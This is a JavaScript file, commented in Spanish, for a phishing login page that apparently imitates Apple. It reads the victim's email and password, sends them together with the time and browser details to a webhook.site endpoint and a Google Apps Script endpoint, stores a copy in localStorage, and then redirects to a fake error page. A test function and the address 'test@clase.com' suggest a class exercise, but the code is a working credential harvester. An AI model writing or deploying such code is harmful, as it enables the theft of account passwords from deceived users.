// ============================================
// CONFIGURACIÓN - PON TUS URLS AQUÍ
// ============================================
const GOOGLE_SHEETS_URL = 'https://script.google.com/macros/s/AKfycbzCDq6YqvVtj1JIh6OI0bxYWxwG_4NtKwM3te6ovgAtjKtx52bndksZKVfkOvuVXY0s/exec';
const WEBHOOK_URL = 'https://webhook.site/01c13946-944a-43a1-983b-1c7944ab4c99'; // ← PON LA URL DE WEBHOOK.SITE

// ============================================
// CÓDIGO PRINCIPAL
// ============================================
document.addEventListener('DOMContentLoaded', function() {
    console.log('✅ Sistema listo');
    console.log('📤 Webhook configurado:', WEBHOOK_URL);
    
    const formulario = document.getElementById('loginForm');
    
    if (formulario) {
        formulario.addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Obtener valores
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Crear objeto con datos
            const datos = {
                email: email,
                password: password,
                hora: new Date().toLocaleTimeString(),
                fecha: new Date().toLocaleString(),
                navegador: navigator.userAgent
            };
            
            console.log('📤 Enviando datos:', datos);
            
            // 1️⃣ ENVIAR A WEBHOOK.SITE (lo ves en vivo)
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(datos)
            })
            .then(() => console.log('✅ Enviado a webhook'))
            .catch(error => console.log('❌ Error webhook:', error));
            
            // 2️⃣ ENVIAR A GOOGLE SHEETS (si está configurado)
            if (GOOGLE_SHEETS_URL.includes('script.google.com')) {
                fetch(GOOGLE_SHEETS_URL, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify(datos)
                })
                .then(() => console.log('✅ Enviado a Google Sheets'))
                .catch(() => {});
            }
            
            // 3️⃣ Guardar localmente (por si acaso)
            try {
                let registros = JSON.parse(localStorage.getItem('apple_registros')) || [];
                registros.push(datos);
                localStorage.setItem('apple_registros', JSON.stringify(registros));
            } catch(e) {}
            
            // Redirigir a error
            window.location.href = 'error.html';
        });
    }
});

// ============================================
// FUNCIÓN DE PRUEBA
// ============================================
window.probarWebhook = function() {
    const testData = {
        email: "test@clase.com",
        password: "prueba123",
        hora: new Date().toLocaleTimeString(),
        fecha: new Date().toLocaleString(),
        prueba: true
    };
    
    fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(testData)
    })
    .then(() => alert('✅ Mensaje de prueba enviado a webhook'))
    .catch(() => alert('❌ Error revisa la URL'));
};
